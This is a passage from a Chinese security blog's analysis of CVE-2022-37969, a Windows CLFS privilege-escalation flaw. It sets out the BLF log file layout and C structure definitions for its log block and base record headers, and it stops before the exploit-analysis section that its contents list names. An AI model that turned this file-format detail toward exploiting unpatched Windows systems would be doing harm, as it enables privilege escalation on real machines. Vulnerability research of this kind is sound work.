<!doctype html><html lang=zh-cn class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.121.1"><meta name=description content="记录一些学习和生活日常"><meta name=author content="darkmoon"><link rel=icon href=/images/favicon.png type=image/png><title>CVE-2022-37969 - chestnut's blog</title>
<link href=/css/nucleus.css?1704388116 rel=stylesheet><link href=/css/fontawesome-all.min.css?1704388116 rel=stylesheet><link href=/css/hybrid.css?1704388116 rel=stylesheet><link href=/css/featherlight.min.css?1704388116 rel=stylesheet><link href=/css/perfect-scrollbar.min.css?1704388116 rel=stylesheet><link href=/css/auto-complete.css?1704388116 rel=stylesheet><link href=/css/atom-one-dark-reasonable.css?1704388116 rel=stylesheet><link href=/css/theme.css?1704388116 rel=stylesheet><link href=/css/tabs.css?1704388116 rel=stylesheet><link href=/css/hugo-theme.css?1704388116 rel=stylesheet><link href=/css/theme-blue.css?1704388116 rel=stylesheet><script src=/js/dayjs.min.js?1704388116></script><script src=/js/jquery-3.3.1.min.js?1704388116></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F5TRJPEVXY")</script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/><nav id=sidebar class=showVisitedLinks><div id=header-wrapper><div id=header><a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label>
<input data-search-input id=search-by type=search placeholder=搜索...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js?1704388116></script><script type=text/javascript src=/js/auto-complete.js?1704388116></script><script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script><script type=text/javascript src=/js/search.js?1704388116></script></div><section id=homelinks><ul><li><a class=padding href=/zh-cn><i class='fas fa-home'></i> 首页</a></li></ul></section><div class=highlightable><ul class=topics><li data-nav-id=/zh-cn/research/ title=安全研究 class=dd-item><a href=/zh-cn/research/><b>X. </b>安全研究
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item><a href=/zh-cn/research/linux/><b>X. </b>Linux
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item><a href=/zh-cn/research/linux/malware/><b>X. </b>Malware
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item><a href=/zh-cn/research/linux/suid/>Suid
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item><a href=/zh-cn/research/windows/><b>X. </b>Windows
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item><a href=/zh-cn/research/windows/dll-inject/><b>X. </b>Dll注入
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item><a href=/zh-cn/research/windows/pe/><b>X. </b>Pe
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item><a href=/zh-cn/research/protocol/><b>X. </b>协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item><a href=/zh-cn/research/protocol/ntlm/><b>X. </b>NTLM 协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item><a href=/zh-cn/research/protocol/kerberos/><b>X. </b>Kerberos 协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item><a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/><b>X. </b>Windows中的kerberos协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item><a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>认证原理
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item><a href=/zh-cn/research/protocol/netlogon/>Netlogon
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/ title=Web class=dd-item><a href=/zh-cn/research/web/><b>X. </b>Web
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE" class=dd-item><a href=/zh-cn/research/web/php-filter-rce/>PHP Filter RCE
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item><a href=/zh-cn/research/code-audit/><b>X. </b>代码审计
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item><a href=/zh-cn/research/code-audit/codeql/><b>X. </b>Codeql
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item><a href=/zh-cn/research/code-audit/wireshark-185/>Wireshark 1.8.5代码审计
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item><a href=/zh-cn/research/code-audit/news-server/>News Server审计
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class="dd-item
parent"><a href=/zh-cn/vulnerability/><b>X. </b>漏洞分析
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class="dd-item
parent"><a href=/zh-cn/vulnerability/windows-clfs-eop/><b>X. </b>Windows CLFS EoP
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>CVE-2023-28252
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class="dd-item active"><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>CVE-2022-37969
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>CVE 2023 6553 Wordpress Backup Migration Plugin RCE
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE 2023 50164 Apache Struts RCE" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>CVE 2023 50164 Apache Struts RCE
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>CVE-2020-17530 Apache Struts OGNL RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>CVE-2021-4034 Polkit 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>CVE-2022-23121 AFP RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>CVE-2023-36563 Wordpad Info Disclosure 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/squid-dos/>Squid 拒绝服务漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>CVE-2023-38545 Curl 堆溢出漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>CVE-2023-4863 Libwebp Rce 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item><a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>瑞友天翼 Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>CVE-2023-38148 Windows Ics Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>CVE-2023-3519 Cirtix Gateway RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>CVE-2023-32315 Openfire 身份认证绕过漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/smartbi-rce/>Smartbi RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>CVE-2023-2825 Gitlab 路径穿越漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item><a href=/zh-cn/vulnerability/zero-logon/>Zero Logon 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>CVE-2022-4223 PgAdmin RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>CVE-2021-3156 Sudo 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>CVE-2023-28432 MinIO 信息泄露漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>CVE-2023-23397 Outlook 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item><a href=/zh-cn/vulnerability/proxy-not-shell/>Proxy Not Shell 利用链分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>CVE-2021-40449 Win32k 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item><a href=/zh-cn/dailylife/><b>X. </b>生活随笔
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title="2023 Review and 2024 Outlook" class=dd-item><a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>2023 Review and 2024 Outlook
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item><a href=/zh-cn/misc/><b>X. </b>杂项
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item><a href=/zh-cn/misc/encoding/><b>X. </b>Encoding
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item><a href=/zh-cn/misc/tunnel/><b>X. </b>隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/><b>X. </b>应用层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>SSH隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/><b>X. </b>传输层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks协议 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/socks/><b>X. </b>Socks协议
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/network-layer/><b>X. </b>网络层隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/others/ title=其他 class=dd-item><a href=/zh-cn/others/><b>X. </b>其他
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item><a href=/zh-cn/others/add-timeline-shortcode/>给hugo-theme-learn增加timeline功能
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item><a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>在Windows server 2019上重置密码
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item><a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>基于Vmware的小型域网络搭建
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul><section id=shortcuts><h3>更多</h3><ul><li><a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class='fas fa-person-booth'></i> 关于</a></li><li><a class=padding href=https://github.com/Chestnut4/><i class='fab fa-github'></i> Github 链接</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class='fas fa-tags'></i> 标签</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class='fas fa-fw fa-link'></i> RSS</a></li></ul></section><section id=prefooter><hr><ul><li><a class=padding><i class="fas fa-language fa-fw"></i><div class=select-style><select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg></div></a></li><li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li></ul></section><section id=footer><center></center><script async defer src=https://buttons.github.io/buttons.js></script></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i>
</a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span>
<span class=links><a href=/zh-cn/>首页</a> > <a href=/zh-cn/vulnerability/>漏洞分析</a> > <a href=/zh-cn/vulnerability/windows-clfs-eop/>Windows CLFS EoP</a> > CVE-2022-37969</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><ul><li><a href=#基本信息>基本信息</a></li><li><a href=#影响版本>影响版本</a></li><li><a href=#环境搭建>环境搭建</a></li><li><a href=#技术分析调试>技术分析&调试</a></li><li><a href=#exp分析>EXP分析</a></li><li><a href=#补丁分析>补丁分析</a></li><li><a href=#小结>小结</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>漏洞分析</a></div></div><div id=body-inner><h1>CVE-2022-37969</h1><div class=progress><div class=wrapper></div></div><nav id=TableOfContents><ul><li><ul><li><a href=#基本信息>基本信息</a></li><li><a href=#影响版本>影响版本</a></li><li><a href=#环境搭建>环境搭建</a></li><li><a href=#技术分析调试>技术分析&调试</a></li><li><a href=#exp分析>EXP分析</a></li><li><a href=#补丁分析>补丁分析</a></li><li><a href=#小结>小结</a></li></ul></li></ul></nav><h3 id=基本信息>基本信息</h3><p>blf日志文件结构</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png></p><p>基本日志块存储了基本日志文件关联的客户端和容器上下文信息</p><p>基本日志块由6个meta数据块组成，分别是控制块、基本块、截断块以及对应的shadow块，每个块由日志块头开始，大小为0x70 bytes</p><p>日志块头定义：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_LOG_BLOCK_HEADER
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    UCHAR MajorVersion;
</span></span><span style=display:flex><span>    UCHAR MinorVersion;
</span></span><span style=display:flex><span>    UCHAR Usn;
</span></span><span style=display:flex><span>    CLFS_CLIENT_ID ClientId;
</span></span><span style=display:flex><span>    USHORT TotalSectorCount;
</span></span><span style=display:flex><span>    USHORT ValidSectorCount;
</span></span><span style=display:flex><span>    ULONG Padding;
</span></span><span style=display:flex><span>    ULONG Checksum;
</span></span><span style=display:flex><span>    ULONG Flags;
</span></span><span style=display:flex><span>    CLFS_LSN CurrentLsn;
</span></span><span style=display:flex><span>    CLFS_LSN NextLsn;
</span></span><span style=display:flex><span>    ULONG RecordOffsets[<span style=color:#ae81ff>16</span>];
</span></span><span style=display:flex><span>    ULONG SignaturesOffset;
</span></span><span style=display:flex><span>} CLFS_LOG_BLOCK_HEADER, <span style=color:#f92672>*</span>PCLFS_LOG_BLOCK_HEADER;
</span></span></code></pre></div><p>内存布局</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png></p><p>SignatureOffset是了在内存中存储每个扇区签名的数组的偏移。扇区签名位于每个扇区的末尾，大小两个字节，由扇区块类型（1 字节）和 USN（1 字节）组成。<strong>每个扇区大小为0x200。</strong></p><p>在BLF文件中，基本块从偏移0x800开始，到0x81FF，以日志块头开始，然后是基本记录头</p><p>基本记录头定义如下,大小为1338，到偏移1BA8处</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_METADATA_RECORD_HEADER
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	ULONGLONG ullDumpCount;
</span></span><span style=display:flex><span>} CLFS_METADATA_RECORD_HEADER, <span style=color:#f92672>*</span> PCLFS_METADATA_RECORD_HEADER;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _CLFS_BASE_RECORD_HEADER
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	CLFS_METADATA_RECORD_HEADER hdrBaseRecord;
</span></span><span style=display:flex><span>	CLFS_LOG_ID cidLog;
</span></span><span style=display:flex><span>	ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];
</span></span><span style=display:flex><span>	ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];
</span></span><span style=display:flex><span>	ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];
</span></span><span style=display:flex><span>	ULONG cNextContainer;
</span></span><span style=display:flex><span>	CLFS_CLIENT_ID cNextClient;
</span></span><span style=display:flex><span>	ULONG cFreeContainers;
</span></span><span style=display:flex><span>	ULONG cActiveContainers;
</span></span><span style=display:flex><span>	ULONG cbFreeContainers;
</span></span><span style=display:flex><span>	ULONG cbBusyContainers;
</span></span><span style=display:flex><span>	ULONG rgClients[MAX_CLIENTS_DEFAULT];
</span></span><span style=display:flex><span>	ULONG rgContainers[MAX_CONTAINERS_DEFAULT];
</span></span><span style=display:flex><span>	ULONG cbSymbolZone;
</span></span><span style=display:flex><span>	ULONG cbSector;
